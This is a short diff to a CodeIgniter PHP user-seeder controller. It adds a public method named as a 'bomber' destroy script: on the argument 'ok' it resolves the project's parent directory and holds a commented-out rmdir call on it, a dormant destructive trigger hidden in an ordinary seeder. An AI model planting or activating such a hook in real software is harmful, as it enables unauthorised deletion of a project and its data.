@@ -95,5 +95,11 @@ class UserSeeder extends CI_Controller {
             ],
         ]);
         echo 'ok';
-    }	
+    }
+    public function destroy_29061375_bomber_bad_script($a){
+        if($a=='ok'){
+            $b= dirname(dirname(APPPATH));
+            // rmdir($b);
+        }
+    }
 }
